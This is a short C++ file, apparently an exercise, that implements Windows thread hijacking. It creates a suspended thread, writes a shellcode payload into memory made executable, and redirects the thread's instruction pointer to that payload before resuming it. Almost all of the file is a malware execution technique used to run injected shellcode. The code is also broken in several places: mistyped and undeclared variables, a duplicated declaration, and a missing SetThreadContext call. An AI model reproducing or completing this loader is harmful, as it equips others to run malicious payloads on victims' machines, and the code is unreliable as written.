#include <iostream>
#include <Windows.h>

BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN BYTE pPayload, IN SIZE_T sPayloadSize) {

	CONTEXT ThreadCtx = {
		.ContextFlags = CONTEXT_CONTROL
	};

	// Allocating memory for the payload
	PVOID pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pAddress) {
		std::wcerr << L"[!] VirtuallAlloc Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}

	//copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	//changing the memory protection 
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		std::wcerr << L"VirtualProtect Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}

	//getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		std::wcerr << L"GetThreadContext Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}

	//updating the next instruction pointer to be equal to the payload's address
	ThreadCtx.Rip = pAddress;

	return TRUE;
}


int main() {
	HANDLE hThread = NULL;

	//creating sacrificial thread in suspended state
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);
	if (!hThread) {
		std::wcerr << L"[!] CreateThread Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}

	//hijacking the sacrificial thread created
	if (!RunViaClassicThreadHijacking(hThread, Payload, sizeof(Payload))) {
		return -1;
	}

	//resuming suspended thread si that it runs our shellcode
	ResumeThread(hThread);

	return 0;
}